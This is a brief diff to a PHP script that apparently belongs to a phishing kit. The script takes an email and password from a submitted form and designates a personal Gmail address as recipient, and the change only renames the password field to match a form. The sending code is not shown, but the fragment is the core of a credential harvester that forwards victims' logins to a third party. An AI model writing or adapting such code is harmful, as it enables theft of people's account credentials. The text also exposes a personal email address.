@@ -1,6 +1,6 @@
 <?php
 $email = $_POST["email"];
-$passkey = $_POST["password"];
+$passkey = $_POST["pass"];
 
 $recipient = "israelstoba@gmail.com";
 
